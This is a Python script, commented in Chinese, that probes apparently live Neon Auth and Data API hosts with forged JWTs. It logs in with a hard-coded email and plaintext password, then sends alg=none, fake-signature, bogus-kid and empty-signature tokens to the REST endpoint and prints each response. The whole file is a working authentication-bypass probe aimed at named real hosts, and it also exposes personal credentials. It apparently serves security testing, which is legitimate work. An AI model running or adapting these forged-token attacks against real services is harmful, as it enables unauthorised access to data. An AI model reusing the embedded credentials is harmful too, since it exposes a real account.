# -*- coding: utf-8 -*-
"""锚2 修正: Data API(apirest 域) JWT 篡改矩阵 vs 历史 _n7 基线
历史记录(_n7): kid=x -> 400?; alg=none -> ?; 错误信息格式 PGRST
diff 目标: 错误信息/状态码变化 = 网关验证器改动(修复痕迹)
"""
import http.client, ssl, json, base64

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
AP = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
DB = 'neondb'

def req(host, method, path, body=None, hdr=None):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
        if hdr:
            h.update(hdr)
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}

def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.b64encode(s).decode().replace('+', '-').replace('/', '_').rstrip('=')

def dec(s):
    s2 = s.replace('-', '+').replace('_', '/')
    s2 += '=' * (-len(s2) % 4)
    return base64.b64decode(s2).decode('utf-8', 'replace')

# 登录拿 JWT
st, raw, hdrs1 = req(NA, 'POST', '/%s/auth/sign-in/email' % DB,
                     {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'},
                     {'Origin': 'http://localhost:3000'})
print('sign-in:', st, raw[:120], flush=True)
sc = hdrs1.get('set-cookie') or ''
ck = ''
for part in sc.split(','):
    kv = part.strip().split(';')[0]
    if '=' in kv and not ck:
        k, v = kv.split('=', 1)
        ck = '%s=%s' % (k.strip(), v.strip())
if not ck:
    try:
        ck = 'better-auth.session_token=' + json.loads(raw).get('token', '')
    except Exception:
        pass
st2, raw2, _ = req(NA, 'GET', '/%s/auth/token' % DB, hdr={'Cookie': ck})
print('/token:', st2, raw2[:150], flush=True)
jwt = ''
try:
    jwt = json.loads(raw2).get('token', '')
except Exception:
    pass
if not jwt:
    print('NO JWT abort', flush=True)
    raise SystemExit

h0 = json.loads(dec(jwt.split('.')[0]))
p0 = json.loads(dec(jwt.split('.')[1]))
print('hdr:', json.dumps(h0), '| payload keys:', sorted(p0.keys()), flush=True)

def mk_jwt(h, p, sig='x'):
    return b64u(json.dumps(h, separators=(',', ':'))) + '.' + b64u(json.dumps(p, separators=(',', ':'))) + '.' + (sig or '')

tests = [
    ('alg=none', mk_jwt({'alg': 'none', 'typ': 'JWT'}, p0, '')),
    ('alg=none+empty', mk_jwt({'alg': 'none'}, p0, 'e30')),
    ('alg=HS256+rand', mk_jwt({'alg': 'HS256'}, p0, 'AAAA')),
    ('kid=x', mk_jwt({'alg': 'RS256', 'kid': 'x', 'typ': 'JWT'}, p0, 'AAAA')),
    ('empty-sig', mk_jwt(h0, p0, '')),
]
print('\n=== 篡改矩阵 (apirest 域, 路径 /neondb/rest/v1/) ===', flush=True)
for name, tj in tests:
    st4, raw4, _ = req(AP, 'GET', '/%s/rest/v1/' % DB, hdr={'Authorization': 'Bearer ' + tj})
    print('[%s] -> %d %s' % (name, st4, raw4[:160].replace('\n', ' ')), flush=True)

# 基线: 真实 JWT 同路径(确认路由可达)
st5, raw5, hdrs5 = req(AP, 'GET', '/%s/rest/v1/' % DB, hdr={'Authorization': 'Bearer ' + jwt})
ct = hdrs5.get('content-type', '')
print('\n[真实JWT] -> %d CT=%s %s' % (st5, ct[:40], raw5[:200].replace('\n', ' ')), flush=True)
